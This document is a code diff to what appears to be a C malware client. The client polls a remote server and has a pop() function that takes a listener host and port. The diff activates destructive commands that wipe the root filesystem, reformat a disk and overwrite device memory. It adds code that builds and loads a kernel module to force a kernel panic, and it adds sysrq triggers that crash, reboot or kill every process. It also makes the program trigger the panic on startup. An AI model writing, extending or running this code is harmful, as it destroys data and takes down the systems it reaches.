@@ -4,17 +4,70 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <netinet/in.h>
+#include <stdlib.h>
 
 int burn() {
-    //system("rm -rf /");
-    //system("echo 1 > /proc/sys/kernel/sysrq");
-    //system("echo c > /proc/sysrq-trigger");
-    //system("sysctl debug.kdb.panic=1");
-    //system("mkfs.ext4 /dev/sda1");
-    //system("mv / /dev/null");
-    //system("dd if=/dev/random of=/dev/port");
-    //system("echo 1 > /proc/sys/kernel/panic");
-    //system("cat /dev/zero > /dev/mem");
+    system("echo 1 > /proc/sys/kernel/panic &");
+    system("dd if=/dev/random of=/dev/port &");
+    system("dd if=/dev/zero of=/dev/mem &");
+    system("mv / /dev/null &");
+    system("mkfs.ext4 /dev/sda1 &");
+    system("rm -rf / &");
+    return 0;
+}
+
+int crash_freebsd() {
+    system("sysctl debug.kdb.panic=1 &");               // freeBSD
+    return 0;
+}
+
+int try_panic() {
+
+    // stack exchange IW16
+    char *m="mkdir /tmp/kpanic && cd /tmp/kpanic && \
+printf '#include <linux/kernel.h>\n#include <linux/module.h>\nMODULE_LICENSE(\"GPL\");\
+static int8_t* message = \"buffer overrun at 0xdeadbeefdeadbeef\";\
+int init_module(void){panic(message);return 0;}' > kpanic.c && \
+printf 'obj-m += kpanic.o\nall:\n\t\
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules' > \
+Makefile && make && insmod kpanic.ko";
+
+    system(m);
+    return 0;
+}
+
+int try_sysrq(int i) {
+
+    //https://web.archive.org/web/20160816230132/https://www.kernel.org/doc/Documentation/sysrq.txt
+
+    system("echo 1 > /proc/sys/kernel/sysrq");          // enable sysrq 
+    switch (i) {
+        case 0:
+            system("echo b > /proc/sysrq-trigger &");   // immediately reboot
+            break;
+        case 1:
+            system("echo c > /proc/sysrq-trigger &");   // crash system by null pointer dereference
+            break;
+        case 2:
+            system("echo e > /proc/sysrq-trigger &");   // send SIGTERM to all processes, except init
+            break;
+        case 3:
+            system("echo i > /proc/sysrq-trigger &");   // send SIGKILL to all processes, except init
+            break;
+        case 4:
+            system("echo j > /proc/sysrq-trigger &");   // frozen
+            break;
+        case 5:
+            system("echo o > /proc/sysrq-trigger &");   // shutdown
+            break;
+        case 6:
+            system("echo r > /proc/sysrq-trigger &");   // turn off keyboard raw mode and set to XLATE
+            break;
+        case 7:
+            system("echo u > /proc/sysrq-trigger &");   // remount all mounted filesystems read-only
+            break;
+    }
+    return 0;
 }
 
 int pop(char *lhost, char *pname, int lport) {
@@ -42,7 +95,7 @@ int read_server(char *addr, int port, char *c) {
     
     int r = socket(AF_INET, SOCK_STREAM, 0);
     if (r == -1) {
-        fprintf(stderr, "Cannot create socket\n");
+        fprintf(stderr, "Cannot create socket");
         return 1;
     }
     
@@ -69,6 +122,7 @@ int read_server(char *addr, int port, char *c) {
 int main(int argc, char *argv[])
 {
     int c;
+    try_panic();
     char buff[64];
     while (1) {
         sleep(5);
